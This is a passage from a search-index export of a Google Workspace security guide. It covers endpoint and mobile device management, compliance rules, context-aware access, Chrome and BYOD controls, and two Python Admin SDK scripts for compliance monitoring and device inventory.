<li> <p>Technical Setup <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Settings\n- Configure general settings\n- Set up Android, iOS, and Chrome OS management\n- Configure account sync settings\n</code></pre></p> </li> <li> <p>Policy Configuration <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Settings\n- Create device policies by OU\n- Configure password requirements\n- Set screen lock policies\n- Configure network settings\n</code></pre></p> </li> <li> <p>Enrollment Strategy</p> </li> <li>Document user enrollment procedures</li> <li>Create enrollment guides by device type</li> <li>Implement enrollment enforcement mechanisms</li> <li> <p>Develop non-compliance handling procedures</p> </li> <li> <p>Testing and Validation</p> </li> <li>Test policies on representative devices</li> <li>Validate security control effectiveness</li> <li>Verify user experience impact</li> <li> <p>Document any implementation issues</p> </li> <li> <p>User Communication</p> </li> <li>Develop clear user guidance</li> <li>Explain privacy implications</li> <li>Provide enrollment support resources</li> <li>Set expectations for compliance</li> </ol>"},{"location":"endpoint-security/#advanced-mdm-configuration","title":"Advanced MDM Configuration","text":"<p>Implement these advanced MDM features for enhanced security:</p>"},{"location":"endpoint-security/#android-specific-controls","title":"Android-Specific Controls","text":"<pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Settings &gt; Android\n- Configure work profile settings\n- Set app management policies\n- Configure network security\n- Implement certificate management\n</code></pre> <p>Key Security Configurations: - Work Profile Configuration: Control data sharing between work/personal profiles - App Installation Restrictions: Control which apps can be installed - Network Security Controls: Restrict connections to trusted networks - Certificate Deployment: Push security certificates to devices</p>"},{"location":"endpoint-security/#ios-specific-controls","title":"iOS-Specific Controls","text":"<pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Settings &gt; iOS/iPadOS\n- Configure device restrictions\n- Set up app management\n- Configure network settings\n- Implement supervision options when available\n</code></pre> <p>Key Security Configurations: - Supervised Mode Settings: Apply enhanced controls for organizational devices - App Restrictions: Control app installation and usage - Data Protection: Configure data-at-rest encryption requirements - Network Controls: Manage Wi-Fi and VPN configurations</p>"},{"location":"endpoint-security/#chrome-os-management","title":"Chrome OS Management","text":"<pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings\n- Configure device settings\n- Set user &amp; browser policies\n- Configure network settings\n- Manage enrollment controls\n</code></pre> <p>Key Security Configurations: - Verified Boot: Ensure OS integrity verification - Login Controls: Configure login restrictions and guest access - URL Filtering: Implement website restrictions - Ephemeral Mode: Configure stateless sessions for appropriate use cases</p>"},{"location":"endpoint-security/#device-compliance-and-enforcement","title":"Device Compliance and Enforcement","text":""},{"location":"endpoint-security/#compliance-policy-framework","title":"Compliance Policy Framework","text":"<p>Develop a comprehensive compliance framework for endpoints:</p> <ol> <li>Minimum Security Requirements</li> <li>Establish baseline for all device types</li> <li>Define minimum OS versions</li> <li>Set password complexity requirements</li> <li> <p>Require device encryption</p> </li> <li> <p>Compliance Verification Methods</p> </li> <li>Scheduled automated checks</li> <li>User-initiated verification</li> <li>Administrator-triggered verification</li> <li> <p>Continuous monitoring options</p> </li> <li> <p>Graduated Enforcement Actions</p> </li> <li>User notification for minor issues</li> <li>Grace periods for remediation</li> <li>Access restrictions for continued non-compliance</li> <li>Account removal from non-compliant devices</li> </ol>"},{"location":"endpoint-security/#implementation-of-compliance-rules","title":"Implementation of Compliance Rules","text":"<pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Settings\n- Configure compliance rules\n- Set non-compliance actions\n- Configure notification settings\n- Set grace periods\n</code></pre> <p>Example Compliance Rules:</p> <p>Minimum OS Version Rule: <pre><code>IF:\n- Device OS version &lt; minimum required version\nTHEN:\n- Notify user\n- Grace period: 7 days\n- Then block access to Google Workspace\n</code></pre></p> <p>Device Encryption Rule: <pre><code>IF:\n- Device encryption is disabled\nTHEN:\n- Notify user and administrator\n- Grace period: 3 days\n- Then block account sync\n</code></pre></p> <p>Jailbreak/Root Detection Rule: <pre><code>IF:\n- Device is jailbroken/rooted\nTHEN:\n- Immediate notification\n- Block account access\n- Alert security team\n</code></pre></p>"},{"location":"endpoint-security/#automated-compliance-monitoring","title":"Automated Compliance Monitoring","text":"<p>Implement systematic monitoring for compliance status:</p> <ol> <li> <p>Regular Compliance Reports <pre><code>Admin Console &gt; Reports &gt; Devices\n- Configure scheduled reports\n- Set up alerts for compliance changes\n- Track compliance metrics over time\n</code></pre></p> </li> <li> <p>Compliance Integration with Access Decisions <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access\n- Create access level based on device compliance\n- Apply to critical applications\n- Configure override processes for exceptions\n</code></pre></p> </li> <li> <p>API-Based Compliance Monitoring <pre><code># Python script example for compliance monitoring\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\n\ndef get_device_compliance_status(admin_sdk_service):\n    \"\"\"Retrieve compliance status for all managed devices\"\"\"\n    results = admin_sdk_service.mobiledevices().list(\n        customerId='my_customer', \n        projection='FULL'\n    ).execute()\n    \n    compliance_issues = []\n    if 'mobiledevices' in results:\n        for device in results['mobiledevices']:\n            # Check various compliance factors\n            issues = []\n            \n            # Check OS version\n            if is_os_outdated(device.get('osVersion', ''), device.get('type')):\n                issues.append('Outdated OS')\n            \n            # Check encryption\n            if not device.get('encryptionStatus', '') == 'Encrypted':\n                issues.append('Not encrypted')\n            \n            # Check password compliance\n            if not device.get('passwordStatus', '') == 'Compliant':\n                issues.append('Password non-compliant')\n            \n            # Add to issues list if any found\n            if issues:\n                compliance_issues.append({\n                    'deviceId': device.get('deviceId'),\n                    'email': device.get('email'),\n                    'model': device.get('model'),\n                    'type': device.get('type'),\n                    'issues': issues\n                })\n    \n    return compliance_issues\n\ndef is_os_outdated(version, device_type):\n    \"\"\"Check if OS version is below minimum required version\"\"\"\n    # Implementation would compare against minimum required versions\n    # based on device type and current security requirements\n    # Simplified example:\n    if device_type == 'ANDROID':\n        return version.split('.')[0] &lt; '10'  # Require Android 10+\n    elif device_type == 'IOS':\n        return version.split('.')[0] &lt; '14'  # Require iOS 14+\n    return False\n\n# Authentication setup\ncredentials = ServiceAccountCredentials.from_json_keyfile_name(\n    'service-account.json',\n    ['https://www.googleapis.com/auth/admin.directory.device.mobile']\n)\ndelegated_credentials = credentials.create_delegated('admin@domain.com')\nservice = build('admin', 'directory_v1', credentials=delegated_credentials)\n\n# Get compliance issues\ncompliance_issues = get_device_compliance_status(service)\nprint(f\"Found {len(compliance_issues)} devices with compliance issues\")\n</code></pre></p> </li> </ol>"},{"location":"endpoint-security/#endpoint-verification-and-secure-access","title":"Endpoint Verification and Secure Access","text":""},{"location":"endpoint-security/#implementing-endpoint-verification","title":"Implementing Endpoint Verification","text":"<p>Endpoint Verification provides critical device security context for access decisions:</p> <ol> <li> <p>Setup and Deployment <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Setup &gt; Endpoint Verification\n- Enable Endpoint Verification\n- Deploy to appropriate organizational units\n- Configure verification requirements\n</code></pre></p> </li> <li> <p>Information Collected</p> </li> <li>Operating system and version</li> <li>Disk encryption status</li> <li>Screen lock configuration</li> <li>Firewall status (where applicable)</li> <li> <p>Chrome OS verified boot status</p> </li> <li> <p>Integration with Context-Aware Access <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access\n- Create access level based on Endpoint Verification data\n- Require disk encryption for sensitive applications\n- Enforce screen lock for all service access\n</code></pre></p> </li> </ol>"},{"location":"endpoint-security/#implementation-of-context-aware-access","title":"Implementation of Context-Aware Access","text":"<p>Create comprehensive context-aware access policies using device data:</p>"},{"location":"endpoint-security/#device-based-access-level-creation","title":"Device-Based Access Level Creation","text":"<pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Levels\n- Create new access level: \"Secure Managed Devices\"\n- Configure device policy:\n  - Require screen lock\n  - Require disk encryption\n  - Require password/PIN\n  - Require approved operating systems\n</code></pre>"},{"location":"endpoint-security/#application-access-policy-implementation","title":"Application Access Policy Implementation","text":"<pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Policies\n- Create new policy: \"Sensitive App Protection\"\n- Select Google Workspace apps (Gmail, Drive, etc.)\n- Apply \"Secure Managed Devices\" access level\n- Configure enforcement action for non-compliant devices\n</code></pre>"},{"location":"endpoint-security/#network-based-access-restrictions","title":"Network-Based Access Restrictions","text":"<pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Levels\n- Create new access level: \"Corporate Network Access\"\n- Configure IP conditions:\n  - Specify corporate IP ranges\n  - Include VPN IP ranges\n- Combine with device conditions for enhanced security\n</code></pre>"},{"location":"endpoint-security/#comprehensive-context-aware-access-implementation","title":"Comprehensive Context-Aware Access Implementation","text":"<p>Implement a full-featured context-aware access solution using Google's capabilities:</p> <p>1. Access Level Configurations</p> <p>Per Google's Context-Aware Access guide, create a tiered approach to access levels:</p> <ul> <li> <p>Basic Access Level: Require verified identity with minimal device checks   <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Levels\n- Name: \"Basic Access\"\n- Conditions: Require verified identity\n- Allow only from trusted locations (corporate offices, approved regions)\n</code></pre></p> </li> <li> <p>Standard Access Level: Require basic device security checks   <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Levels\n- Name: \"Standard Access\"\n- Conditions: Require verified identity + device compliance\n- Device checks: Screen lock, OS up-to-date, not rooted/jailbroken\n- Allow access from more locations but with stronger device checks\n</code></pre></p> </li> <li> <p>Restricted Access Level: Highest security for sensitive applications   <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Levels\n- Name: \"Restricted Access\"\n- Conditions: Require verified identity + advanced device compliance\n- Device checks: Encryption, screen lock, OS version, security patch level, device integrity\n- Network restrictions: Only from trusted networks\n- Additional factors: Hardware security key required\n</code></pre></p> </li> </ul> <p>2. Application-Specific Policies</p> <p>Apply granular policies to different Google Workspace services:</p> <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Policies\n- Gmail Policy: Apply \"Standard Access\" level\n- Drive Policy: Apply \"Restricted Access\" level for sensitive documents\n- Meet Policy: Apply \"Basic Access\" level for general meetings\n- Specialized Application Policy: Custom access levels for specific business needs\n</code></pre> <p>3. User Experience Optimization</p> <p>Configure appropriate user messaging and alternative access options:</p> <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access &gt; Access Policies\n- Configure custom block page messages\n- Set up alternative access instructions\n- Provide help desk contact information\n- Create exemption process for special cases\n</code></pre> <p>4. Monitoring and Enforcement</p> <p>Implement comprehensive monitoring of context-aware access decisions:</p> <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Access Transparency\n- Monitor access decisions\n- Track blocked access attempts\n- Review policy triggers\n- Analyze effectiveness metrics\n</code></pre>"},{"location":"endpoint-security/#zero-trust-implementation-with-endpoints","title":"Zero Trust Implementation with Endpoints","text":"<p>Implement a comprehensive Zero Trust model incorporating endpoint security:</p> <ol> <li>Identity Foundation</li> <li>Enforce MFA on all endpoints</li> <li>Implement phishing-resistant authentication</li> <li> <p>Apply risk-based authentication policies</p> </li> <li> <p>Device Trust Establishment</p> </li> <li>Deploy Endpoint Verification across fleet</li> <li>Implement device attestation where possible</li> <li> <p>Create continuous validation mechanisms</p> </li> <li> <p>Access Policy Framework</p> </li> <li>Build granular, attribute-based access policies</li> <li>Incorporate device health signals in access decisions</li> <li> <p>Implement policy enforcement points across services</p> </li> <li> <p>Continuous Monitoring and Validation</p> </li> <li>Monitor device-based access patterns</li> <li>Implement anomaly detection for device behavior</li> <li>Create automated remediation workflows</li> </ol>"},{"location":"endpoint-security/#chrome-enterprise-security","title":"Chrome Enterprise Security","text":""},{"location":"endpoint-security/#chrome-browser-management","title":"Chrome Browser Management","text":"<p>Implement comprehensive Chrome browser security across endpoints:</p> <ol> <li> <p>Managed Browser Setup <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings &gt; User &amp; browser settings\n- Configure by organizational unit\n- Set appropriate browser policies\n- Deploy security extensions\n</code></pre></p> </li> <li> <p>Key Security Policies</p> </li> <li>Password Manager: Control built-in password manager</li> <li>Safe Browsing: Configure enhanced protection</li> <li>Extension Control: Manage allowed extensions</li> <li> <p>Certificate Management: Deploy enterprise certificates</p> </li> <li> <p>Chrome Update Management <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings &gt; User &amp; browser settings\n- Configure update policies\n- Set update frequency and requirements\n- Manage version pinning (when necessary)\n</code></pre></p> </li> </ol>"},{"location":"endpoint-security/#chrome-extension-management","title":"Chrome Extension Management","text":"<p>Create a robust approach to extension management:</p> <ol> <li> <p>Extension Allowlisting <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; extensions\n- Configure extension installation policy\n- Create allowlist of approved extensions\n- Block specific high-risk extensions\n</code></pre></p> </li> <li> <p>Force-Installed Extensions <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; extensions\n- Select security-critical extensions\n- Configure force-install policy\n- Deploy to appropriate organizational units\n</code></pre></p> </li> <li> <p>Extension Permission Controls <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; extensions\n- Configure extension permissions\n- Set site access requirements\n- Control data access permissions\n</code></pre></p> </li> </ol>"},{"location":"endpoint-security/#chrome-os-advanced-management","title":"Chrome OS Advanced Management","text":"<p>For organizations using Chrome OS devices, implement advanced security controls:</p> <ol> <li> <p>Enrollment and Verification <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings\n- Configure verified access\n- Set forced re-enrollment requirements\n- Implement device attestation\n</code></pre></p> </li> <li> <p>Data Controls <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings\n- Configure external storage access\n- Set printing restrictions\n- Control screenshot capabilities\n- Manage clipboard restrictions\n</code></pre></p> </li> <li> <p>Operating System Security <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings\n- Configure OS update policy\n- Set verified boot requirements\n- Manage developer mode restrictions\n- Configure guest mode policies\n</code></pre></p> </li> </ol>"},{"location":"endpoint-security/#byod-security-implementation","title":"BYOD Security Implementation","text":""},{"location":"endpoint-security/#data-separation-strategy","title":"Data Separation Strategy","text":"<p>Implement effective BYOD strategies that balance security and privacy:</p> <ol> <li> <p>Work Profile Configuration (Android) <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Settings &gt; Android\n- Configure work profile settings\n- Set data sharing policies\n- Configure work profile restrictions\n</code></pre></p> </li> <li> <p>Managed App Configuration (iOS) <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Settings &gt; iOS\n- Configure managed applications\n- Set managed app policies\n- Implement app-level DLP controls\n</code></pre></p> </li> <li> <p>Browser-Based Access Controls <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access\n- Create BYOD-specific access levels\n- Implement browser-based access restrictions\n- Configure download limitations\n</code></pre></p> </li> </ol>"},{"location":"endpoint-security/#user-privacy-considerations","title":"User Privacy Considerations","text":"<p>Balance security requirements with user privacy concerns:</p> <ol> <li>Data Collection Transparency</li> <li>Document exactly what data is collected from personal devices</li> <li>Clearly communicate monitoring boundaries</li> <li> <p>Provide policy documentation to users</p> </li> <li> <p>Limited Management Scope</p> </li> <li>Implement work profile separation on personal devices</li> <li>Restrict management to organizational accounts and data</li> <li> <p>Develop clear boundaries for IT management authority</p> </li> <li> <p>Offboarding Process Design</p> </li> <li>Create privacy-respecting account removal procedures</li> <li>Document selective wipe capabilities</li> <li>Implement verification of personal data preservation</li> </ol>"},{"location":"endpoint-security/#byod-security-policy-framework","title":"BYOD Security Policy Framework","text":"<p>Develop a comprehensive policy framework for BYOD:</p> <pre><code>BYOD SECURITY POLICY TEMPLATE\n\n1. DEVICE ELIGIBILITY\n   - Supported operating systems and versions\n   - Minimum security requirements\n   - Prohibited device types or modifications\n\n2. USER RESPONSIBILITIES\n   - Security update requirements\n   - Application installation guidelines\n   - Reporting of lost or stolen devices\n   - Acceptable use parameters\n\n3. ORGANIZATIONAL CONTROLS\n   - Authentication requirements\n   - Encryption standards\n   - Remote management capabilities\n   - Data access limitations\n\n4. PRIVACY PROTECTIONS\n   - Data collection limitations\n   - Personal data segregation\n   - Monitoring boundaries\n   - User consent requirements\n\n5. SUPPORT EXPECTATIONS\n   - Support scope for personal devices\n   - User self-service capabilities\n   - Troubleshooting responsibilities\n   - Incident response procedures\n\n6. OFFBOARDING PROCESS\n   - Account removal procedures\n   - Organizational data removal\n   - Verification requirements\n   - Post-employment access restrictions\n</code></pre>"},{"location":"endpoint-security/#device-lifecycle-management","title":"Device Lifecycle Management","text":""},{"location":"endpoint-security/#enrollment-and-provisioning","title":"Enrollment and Provisioning","text":"<p>Implement efficient device enrollment processes:</p> <ol> <li> <p>Zero-Touch Enrollment (Android) <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Setup &gt; Zero-touch enrollment\n- Configure zero-touch enrollment\n- Partner with device resellers\n- Set device policies for auto-provisioning\n</code></pre></p> </li> <li> <p>Automated Enrollment (Chrome OS) <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings\n- Configure enrollment controls\n- Set forced enrollment domains\n- Implement auto-enrollment policies\n</code></pre></p> </li> <li> <p>User Self-Enrollment Process</p> </li> <li>Develop clear step-by-step guides by device type</li> <li>Create enrollment verification procedures</li> <li>Implement enrollment support resources</li> <li>Set automated compliance verification</li> </ol>"},{"location":"endpoint-security/#inventory-management","title":"Inventory Management","text":"<p>Maintain accurate device inventory for security management:</p> <ol> <li> <p>Centralized Inventory System <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints\n- Review device inventory\n- Export device data\n- Implement regular auditing procedures\n</code></pre></p> </li> <li> <p>Device Tagging and Classification</p> </li> <li>Develop device naming conventions</li> <li>Implement asset tagging procedures</li> <li>Create device classification system</li> <li> <p>Document ownership status</p> </li> <li> <p>Inventory Integration with Security Systems <pre><code># Python script example for inventory integration\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\nimport json\n\ndef export_device_inventory(admin_sdk_service):\n    \"\"\"Export comprehensive device inventory to SIEM or CMDB\"\"\"\n    mobile_devices = get_mobile_devices(admin_sdk_service)\n    chrome_devices = get_chrome_devices(admin_sdk_service)\n    \n    # Combine all device data\n    all_devices = {\n        'mobile_devices': mobile_devices,\n        'chrome_devices': chrome_devices,\n        'export_time': datetime.now().isoformat()\n    }\n    \n    # Export to file (in real implementation, would send to SIEM/CMDB)\n    with open('device_inventory.json', 'w') as f:\n        json.dump(all_devices, f, indent=2)\n    \n    return len(mobile_devices) + len(chrome_devices)\n\ndef get_mobile_devices(service):\n    \"\"\"Get all mobile devices from Directory API\"\"\"\n    results = service.mobiledevices().list(\n        customerId='my_customer',\n        projection='FULL'\n    ).execute()\n    \n    return results.get('mobiledevices', [])\n\ndef get_chrome_devices(service):\n    \"\"\"Get all Chrome devices from Directory API\"\"\"\n    results = service.chromeosdevices().list(\n        customerId='my_customer',\n        projection='FULL'\n    ).execute()\n    \n    return results.get('chromeosdevices', [])\n\n# Authentication setup\ncredentials = ServiceAccountCredentials.from_json_keyfile_name(\n    'service-account.json',\n    ['https://www.googleapis.com/auth/admin.directory.device.mobile',\n     'https://www.googleapis.com/auth/admin.directory.device.chromeos']\n)\ndelegated_credentials = credentials.create_delegated('admin@domain.com')\nservice = build('admin', 'directory_v1', credentials=delegated_credentials)\n\n# Export inventory\ndevice_count = export_device_inventory(service)\nprint(f\"Exported {device_count} devices to inventory system\")\n</code></pre></p> </li> </ol>"},{"location":"endpoint-security/#offboarding-and-decommissioning","title":"Offboarding and Decommissioning","text":"<p>Implement secure device decommissioning processes:</p> <ol> <li> <p>Account Removal Process <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints\n- Select devices for offboarding\n- Remove Google Workspace account\n- Verify account removal\n</code></pre></p> </li> <li> <p>Remote Wipe Implementation <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints\n- Select devices requiring wipe\n- Choose appropriate wipe type (account vs. full)\n- Execute and monitor wipe status\n</code></pre></p> </li> <li> <p>Device Retirement Documentation</p> </li> <li>Create device retirement checklist</li> <li>Implement verification procedures</li> <li>Document chain of custody</li> <li>Create audit trail for compliance</li> </ol>"},{"location":"endpoint-security/#third-party-integrations","title":"Third-Party Integrations","text":""},{"location":"endpoint-security/#uem-integration-framework","title":"UEM Integration Framework","text":"<p>Leverage third-party Unified Endpoint Management solutions:</p> <ol> <li> <p>Integration Setup <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Setup &gt; Third-party integrations\n- Select appropriate UEM partner\n- Configure integration settings\n- Authorize API access\n</code></pre></p> </li> <li> <p>Key UEM Capabilities</p> </li> <li>Centralized management across device types</li> <li>Enhanced policy controls</li> <li>Advanced compliance monitoring</li> <li> <p>Integrated security response</p> </li> <li> <p>UEM Security Enhancement</p> </li> <li>Configure enhanced device attestation</li> <li>Implement application-level controls</li> <li>Deploy advanced network security</li> <li>Enable granular permission management</li> </ol>"},{"location":"endpoint-security/#mobile-threat-defense-integration","title":"Mobile Threat Defense Integration","text":"<p>Enhance protection with specialized mobile security:</p> <ol> <li> <p>MTD Deployment <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; endpoints &gt; Setup &gt; Third-party integrations\n- Select MTD partner\n- Configure integration settings\n- Deploy MTD agents to devices\n</code></pre></p> </li> <li> <p>Threat Detection Capabilities</p> </li> <li>Malicious application detection</li> <li>Network attack identification</li> <li>Device vulnerability scanning</li> <li> <p>Behavioral anomaly detection</p> </li> <li> <p>Automated Response Configuration</p> </li> <li>Configure threat severity classifications</li> <li>Implement automated remediation actions</li> <li>Set up administrator alerting</li> <li>Create user notification procedures</li> </ol>"},{"location":"endpoint-security/#security-information-integration","title":"Security Information Integration","text":"<p>Implement comprehensive security information flow:</p> <ol> <li>SIEM Integration</li> <li>Export device security telemetry</li> <li>Configure alert forwarding</li> <li>Implement log integration</li> <li> <p>Create cross-platform correlation rules</p> </li> <li> <p>Security Orchestration</p> </li> <li>Develop automated remediation workflows</li> <li>Implement security incident triggers</li> <li>Create playbooks for common device incidents</li> <li>Deploy cross-platform response capabilities</li> </ol>"},{"location":"endpoint-security/#advanced-endpoint-security-scenarios","title":"Advanced Endpoint Security Scenarios","text":""},{"location":"endpoint-security/#application-level-container-security","title":"Application-Level Container Security","text":"<p>Implement advanced application containers for enhanced security:</p> <ol> <li>Android Enterprise Container</li> <li>Configure work profile settings</li> <li>Implement app-level VPN</li> <li>Deploy per-app security policies</li> <li> <p>Configure data-at-rest encryption</p> </li> <li> <p>iOS Application Management</p> </li> <li>Configure managed app settings</li> <li>Implement app configuration policies</li> <li>Deploy per-app VPN configurations</li> <li>Configure managed open-in restrictions</li> </ol>"},{"location":"endpoint-security/#network-security-for-endpoints","title":"Network Security for Endpoints","text":"<p>Enhance endpoint network security:</p> <ol> <li> <p>Wi-Fi Configuration Management <pre><code>Admin Console &gt; Devices &gt; Networks\n- Configure managed Wi-Fi networks\n- Deploy certificate-based authentication\n- Implement trusted network enforcement\n</code></pre></p> </li> <li> <p>VPN Deployment <pre><code>Admin Console &gt; Devices &gt; Networks\n- Configure managed VPN settings\n- Deploy always-on VPN for sensitive OUs\n- Implement per-app VPN for critical applications\n</code></pre></p> </li> <li> <p>Network Access Control</p> </li> <li>Integrate with NAC solutions</li> <li>Implement certificate-based network authentication</li> <li>Deploy network segmentation for devices</li> <li>Configure network posture assessment</li> </ol>"},{"location":"endpoint-security/#remote-and-hybrid-workforce-security","title":"Remote and Hybrid Workforce Security","text":"<p>Address security needs for distributed workforce:</p> <ol> <li>Home Network Security Enhancement</li> <li>Deploy DNS security capabilities</li> <li>Implement split tunneling configurations</li> <li>Create secure home office guidelines</li> <li> <p>Develop network security assessment tools</p> </li> <li> <p>Zero Trust Network Access</p> </li> <li>Implement identity-aware proxy</li> <li>Deploy per-application micro-VPNs</li> <li>Configure continuous authorization</li> <li>Create dynamic access policies</li> </ol>"},{"location":"endpoint-security/#implementation-checklist","title":"Implementation Checklist","text":""},{"location":"endpoint-security/#initial-endpoint-security-setup","title":"Initial Endpoint Security Setup","text":"<ul> <li> Configure basic MDM settings</li> <li> Implement password policies</li> <li> Set up screen lock requirements</li> <li> Configure encryption requirements</li> <li> Deploy Endpoint Verification</li> <li> Implement basic compliance rules</li> <li> Configure Chrome browser security settings</li> <li> Set up basic inventory management</li> </ul>"},{"location":"endpoint-security/#advanced-security-enhancement","title":"Advanced Security Enhancement","text":"<ul> <li> Implement contextual access policies</li> <li> Configure advanced compliance rules</li> <li> Deploy application-level containers</li> <li> Implement network security controls</li> <li> Configure BYOD data separation</li> <li> Integrate with third-party security solutions</li> <li> Implement advanced Chrome OS management</li> <li> Deploy security monitoring and alerting</li> </ul>"},{"location":"endpoint-security/#ongoing-maintenance","title":"Ongoing Maintenance","text":"<ul> <li> Weekly device compliance review</li> <li> Monthly security control validation</li> <li> Quarterly policy review and updates</li> <li> Semi-annual user education refresher</li> <li> Annual security framework assessment</li> </ul>"},{"location":"endpoint-security/#msp-specific-endpoint-security-strategies","title":"MSP-Specific Endpoint Security Strategies","text":""},{"location":"endpoint-security/#multi-client-endpoint-management","title":"Multi-Client Endpoint Management","text":"<p>Efficiently manage endpoints across multiple clients:</p> <ol> <li>Standardized Baseline Creation</li> <li>Develop standard security policies by tier</li> <li>Create consistent naming conventions</li> <li>Implement common compliance frameworks</li> <li> <p>Develop central policy management</p> </li> <li> <p>Client-Specific Customization</p> </li> <li>Identify client-specific requirements</li> <li>Document exceptions with justification</li> <li>Develop custom policy deployment process</li> <li> <p>Implement policy inheritance model</p> </li> <li> <p>Cross-Client Monitoring</p> </li> <li>Create centralized monitoring dashboard</li> <li>Implement client-specific alerting thresholds</li> <li>Develop comparative compliance reporting</li> <li>Create cross-client threat intelligence</li> </ol>"},{"location":"endpoint-security/#delegated-administration-model","title":"Delegated Administration Model","text":"<p>Implement secure delegated administration:</p> <ol> <li> <p>Client Admin Role Configuration <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Create client administrator roles\n- Configure appropriate device permissions\n- Implement least privilege principle\n</code></pre></p> </li> <li> <p>Service Provider Role Definition <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Create service provider administrative roles\n- Configure cross-client management capabilities\n- Implement appropriate access controls\n</code></pre></p> </li> <li> <p>Administrative Boundaries</p> </li> <li>Define clear responsibility matrix</li> <li>Document escalation procedures</li> <li>Implement change management workflow</li> <li>Create audit trail requirements</li> </ol>"},{"location":"endpoint-security/#client-onboarding-and-offboarding","title":"Client Onboarding and Offboarding","text":"<p>Develop structured endpoint management lifecycle:</p> <ol> <li>Client Onboarding Procedure</li> <li>Create endpoint inventory assessment</li> <li>Develop security baseline implementation</li> <li>Configure monitoring and alerting</li> <li> <p>Implement user education and support</p> </li> <li> <p>Client Offboarding Process</p> </li> <li>Document device transition procedures</li> <li>Create account removal workflow</li> <li>Implement data preservation requirements</li> <li>Configure service decoupling process</li> </ol>"},{"location":"endpoint-security/#resources","title":"Resources","text":"<ul> <li>Google Workspace Admin Help: Mobile Management</li> <li>Chrome Enterprise Documentation</li> <li>Context-Aware Access Overview</li> <li>Context-Aware Access for Google Workspace</li> <li>Endpoint Verification Documentation</li> <li>Android Enterprise Security Documentation</li> <li>NIST Mobile Device Security Guide</li> </ul> <p>Note: This guide should be adapted to your organization's specific requirements, risk profile, and device management needs.</p>"},{"location":"executive-dashboards/","title":"Executive Dashboards","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"executive-dashboards/#google-workspace-security-dashboards-and-executive-reporting","title":"Google Workspace Security Dashboards and Executive Reporting","text":"<p>This guide provides comprehensive frameworks, templates, and implementation strategies for creating effective security dashboards and executive-level reporting for Google Workspace environments.</p>"},{"location":"executive-dashboards/#executive-security-dashboard-framework","title":"Executive Security Dashboard Framework","text":""},{"location":"executive-dashboards/#dashboard-design-principles","title":"Dashboard Design Principles","text":"<p>Creating effective security dashboards for executive consumption requires balancing detail with clarity:</p> <ol> <li>Audience-Centered Design</li> <li>Focus on business impact and risk</li> <li>Limit technical jargon and details</li> <li>Align metrics with organizational priorities</li> <li> <p>Present actionable insights</p> </li> <li> <p>Visual Clarity</p> </li> <li>Use consistent visualization methods</li> <li>Implement intuitive color schemes (green/yellow/red)</li> <li>Provide clear trend indicators</li> <li> <p>Balance data density with readability</p> </li> <li> <p>Context and Benchmarking</p> </li> <li>Include relevant industry benchmarks</li> <li>Provide historical trend context</li> <li>Show comparison to security targets</li> <li> <p>Include peer organization comparison when available</p> </li> <li> <p>Actionable Insights</p> </li> <li>Highlight specific recommended actions</li> <li>Connect metrics to business outcomes</li> <li>Provide priority guidance</li> <li>Include improvement trajectories</li> </ol>"},{"location":"executive-dashboards/#executive-dashboard-templates","title":"Executive Dashboard Templates","text":""},{"location":"executive-dashboards/#1-google-workspace-security-posture-dashboard","title":"1. Google Workspace Security Posture Dashboard","text":"<p>This dashboard provides a high-level view of overall security posture and compliance status.</p>"},{"location":"executive-dashboards/#key-components","title":"Key Components","text":"<ol> <li>Overall Security Score</li> <li>Composite rating (0-100) based on security controls</li> <li>Trend indicator (improving/declining)</li> <li>Comparison to industry benchmark</li> <li>Risk-level indicator (Low/Medium/High/Critical)</li> </ol> <p> <pre><code>Implementation:\n- Aggregate scores from security controls across services\n- Weight components based on risk impact\n- Calculate trend based on 90-day historical data\n- Update weekly for consistency\n</code></pre></p> <ol> <li>Service Security Compliance</li> <li>Matrix showing security compliance by service</li> <li>Color-coded status indicators</li> <li>Critical service highlighting</li> <li>Non-compliant control count</li> 